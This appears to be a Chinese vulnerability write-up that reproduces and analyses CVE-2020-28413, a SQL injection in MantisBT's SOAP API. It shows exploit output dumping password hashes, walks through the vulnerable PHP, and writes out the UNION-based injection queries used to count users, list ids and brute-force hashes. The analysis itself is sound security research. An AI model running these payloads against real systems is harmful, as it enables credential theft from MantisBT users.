    Cache-Control: private, max-age=10800
    Last-Modified: Tue, 26 Jul 2022 09:14:43 GMT
    Vary: Accept-Encoding
    Content-Length: 669
    Connection: close
    Content-Type: text/xml; charset=utf-8
    -30
可以看到有了正常的回复
此时再尝试测试完整的exp发现已经可以正常运行
    ╰─$ python3 CVE-2020-28413.py
    Cantidad usuarios en db: 3
    Obteniendo Hashes...
    administrator: 63a9f0ea7bb98050796b649e85481845
    admin: 8ae1653f670543a69ff833a17f2cc21d
    user: 67f600b2654690eec8e96e830e43460e
exp的效果应该是在有一个低级用户的条件下，可以获取所有用户的口令哈希
#### 漏洞分析
在漏洞复现过程中可知本漏洞需要口令密码方可正常运行，根据exp内容大概可以掌握到漏洞脚本文件是mantisconnect.php
    ......
    $t_server = new SoapServer( 'mantisconnect.wsdl',
        array( 'features' => SOAP_USE_XSI_ARRAY_TYPE + SOAP_SINGLE_ELEMENT_ARRAYS )
    );
    $t_server->addFunction( SOAP_FUNCTIONS_ALL );
    $t_server->handle();
    ......
尾部定义了一个soap服务器
因此直接根据请求头中SOAPAction字段：
`SOAPAction:
http://172.16.113.160:10080/mantisbt/api/soap/mantisconnect.php"/mc_project_get_users"`
判断接下来会调用mc_project_get_users方法，此方法定义mc_project_api.php文件当中
    function mc_project_get_users( $p_username, $p_password, $p_project_id, $p_access ) {
        global $g_project_override;
        $t_user_id = mci_check_login( $p_username, $p_password );
        if( $t_user_id === false ) {
            return mci_fault_login_failed();
        }
        $g_project_override = $p_project_id;
        $t_users = project_get_all_user_rows( $p_project_id, $p_access ); # handles ALL_PROJECTS case
        $t_display = array();
        $t_sort = array();
        foreach( $t_users as $t_user ) {
            $t_user_name = user_get_name_from_row( $t_user );
            $t_display[] = string_attribute( $t_user_name );
            $t_sort[] = user_get_name_for_sorting_from_row( $t_user );
        }
        array_multisort( $t_sort, SORT_ASC, SORT_STRING, $t_users, $t_display );
        $t_result = array();
        for( $i = 0;$i 
                 1' OR '1'='1
                 root
                 0
                 1
可以发现运行到此处时，p_username的参数确实是我们设置的1' OR '1'='1值
然而，在运行时执行的命令却被转义了，我们可以运行到下一行察看$t_result的值发现：
究其根本，是因为db_query函数会对参数的值进行转义，进而没有达成sql注入
但是为什么前边acess的值可以做到注入呢，是因为access的值直接被拼接进入的sql语句当中，而不是作为参数传递给db_query函数
    if( $p_include_global_users ) {
            db_param_push();
            $t_query = 'SELECT id, username, realname, access_level
                    FROM {user}
                    WHERE enabled = ' . db_param() . '
                        AND access_level ' . $t_global_access_clause;
            $t_result = db_query( $t_query, array( $t_on ) );
            while( $t_row = db_fetch_array( $t_result ) ) {
                $t_users[(int)$t_row['id']] = $t_row;
            }
        }
#### 漏洞利用方法
对于sql注入了解几乎为零，借此机会顺带了解一下具体的利用流程，先查看一下数据库中的用户表内容，有一个基本掌握
我的用户表中有三个用户，表中还存在密码哈希，id等字段
注入时执行的语句是：
    SELECT id, username, realname, access_level FROM mantis_user_table WHERE enabled = 1 AND access_level >=  {access}
其中{access}便是我们输入的access的值
下面来看一下exp具体执行利用的过程：
exp中，第一阶段包执行以下语句
    SELECT id, username, realname, access_level FROM mantis_user_table WHERE enabled = 1 AND access_level >= 0 union all select concat('-',(select count(*) from mantis_user_table),'0'),2,3,4 order by id asc limit 1
然后获取执行结果中的值,此值为`-`与用户表中数量以及`'0'`的拼接，通过此值可以标记数据库中有效的用户数量,我的数据库中有效用户是3个
第二阶段，然后执行下一条命令
    SELECT id, username, realname, access_level FROM mantis_user_table WHERE enabled = 1 AND access_level >= 0 union all select concat((SELECT id FROM mantis_user_table order by id asc limit 0,1),'0'),2,3,4 limit {1}，1
其中{1}会迭代0-2来获取数据库中每个用户的id号以及用户名
第三个步骤，就是从用户表中取出每一个用户的密码哈希，然后逐字符进行对比，爆破获取每个用户的口令
    SELECT id, username, realname, access_level FROM mantis_user_table WHERE enabled = 1 AND access_level >= 0 union all select (select if(substring((select binary(password) from mantis_user_table where id = {1}),{1},1)='{a}','0','900000000000000000000')), 2,3,4 order by id asc limit 1
其中,{}括起来的数字是会迭代，用于爆破。如果匹配错误，依然会输出第一个有效用户内容
如果匹配正确，则会出现以下内容：
根据匹配的结果即可判断每一个字符爆破是否正确，最终成功猜解出全部的密码哈希值。